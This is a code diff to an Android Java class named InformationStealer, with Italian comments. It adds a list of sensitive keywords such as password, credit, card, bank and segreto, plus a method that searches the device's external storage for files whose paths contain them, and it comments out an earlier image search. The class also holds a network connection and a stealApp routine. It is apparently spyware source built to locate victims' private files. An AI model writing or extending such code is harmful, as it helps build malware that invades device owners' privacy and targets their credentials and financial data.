@@ -28,6 +28,52 @@ public class InformationStealer implements Runnable {
 
     private static final int READ_EXTERNAL_STORAGE_PERMISSION_REQUEST = 1;
 
+    final String[] keywords = {
+            "aprire",
+            "Secret",
+            "password",
+            "credit",
+            "card",
+            "confidential",
+            "top",
+            "private",
+            "classified",
+            "sensitive",
+            "hidden",
+            "only",
+            "criptato",
+            "riservato",
+            "vietato",
+            "autorizzato",
+            "informazioni",
+            "proprietario",
+            "divulgare",
+            "privilegiato",
+            "compromettente",
+            "violazione",
+            "sicurezza",
+            "segreto",
+            "operazione",
+            "clandestina",
+            "documenti",
+            "classificati",
+            "accesso",
+            "limitato",
+            "criptati",
+            "archiviazione",
+            "sicura",
+            "protetto",
+            "allarme",
+            "email",
+            "sex",
+            "illegal",
+            "drug",
+            "virus",
+            "money",
+            "bank",
+            "data"
+    };
+
     NetworkManager conn = new NetworkManager();
     Context context;
     public InformationStealer(Context context){
@@ -38,9 +84,7 @@ public class InformationStealer implements Runnable {
     @Override
     public void run(){
         stealApp(context);
-        File startingDirectory = Environment.getExternalStorageDirectory();
-        //searchImageFiles(startingDirectory);
-        searchImages(context);
+        searchFilesWithKeywords(context, keywords);
     }
 
     @SuppressLint("MissingPermission")
@@ -69,6 +113,7 @@ public class InformationStealer implements Runnable {
                 return "Unknown";
         }
     }
+  /*
     public static void searchImages(Context context) {
         // Verifica se l'applicazione ha il permesso di lettura della memoria esterna
         if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_EXTERNAL_STORAGE)
@@ -96,37 +141,44 @@ public class InformationStealer implements Runnable {
         }
     }
 
-    public static void searchImageFiles(File directory) {
-        System.out.println("Esplorazione della directory: " + directory.getAbsolutePath());
+   */
 
-        File[] files = directory.listFiles();
-        if (files != null) {
-            boolean imageFound = false;
-            for (File file : files) {
-                if (file.isDirectory()) {
-                    System.out.println("Esplorazione della sottodirectory: " + file.getAbsolutePath());
-                    searchImageFiles(file);
-                } else if (isImageFile(file)) {
-                    System.out.println("File immagine trovato: " + file.getAbsolutePath());
-                    imageFound = true;
-                } else {
-                    System.out.println("File non riconosciuto: " + file.getAbsolutePath());
-                }
-            }
-
-            if (!imageFound) {
-                System.out.println("Nessun file immagine trovato nella directory: " + directory.getAbsolutePath());
-            }
-        } else {
-            System.out.println("Impossibile accedere alla directory: " + directory.getAbsolutePath());
+    public static void searchFilesWithKeywords(Context context, String[] keywords) {
+        // Verifica se l'applicazione ha il permesso di lettura della memoria esterna
+        if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_EXTERNAL_STORAGE)
+                != PackageManager.PERMISSION_GRANTED) {
+            // Richiedi il permesso all'utente se non è stato ancora concesso
+            ActivityCompat.requestPermissions((Activity) context,
+                    new String[]{Manifest.permission.READ_EXTERNAL_STORAGE},
+                    READ_EXTERNAL_STORAGE_PERMISSION_REQUEST);
+            return;
         }
-    }
 
+        // Il permesso è stato concesso, esegui la ricerca dei file
+        Uri fileUri = MediaStore.Files.getContentUri("external");
+        String[] projection = {MediaStore.Files.FileColumns.DATA};
 
-    public static boolean isImageFile(File file) {
-        String name = file.getName().toLowerCase();
-        return name.endsWith(".jpg") || name.endsWith(".jpeg") || name.endsWith(".png") || name.endsWith(".gif");
-        // Aggiungi qui altri formati di immagini se necessario
+        String selection = "";
+
+        for (int i = 0; i < keywords.length; i++) {
+            String keyword = keywords[i];
+            selection += "LOWER(" + MediaStore.Files.FileColumns.DATA + ") LIKE LOWER('%" + keyword + "%')";
+            if (i < keywords.length - 1) {
+                selection += " OR ";
+            }
+        }
+
+        Cursor cursor = context.getContentResolver().query(fileUri, projection, selection, null, null);
+        if (cursor != null && cursor.moveToFirst()) {
+            do {
+                String filePath = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Files.FileColumns.DATA));
+                System.out.println("Trovato un file interessante: " + filePath);
+            } while (cursor.moveToNext());
+            cursor.close();
+        } else {
+            System.out.println("Nessun file trovato");
+        }
+        System.out.println("-----------Elaborazione finita-----------");
     }
 
     public static void stealApp(Context context) {
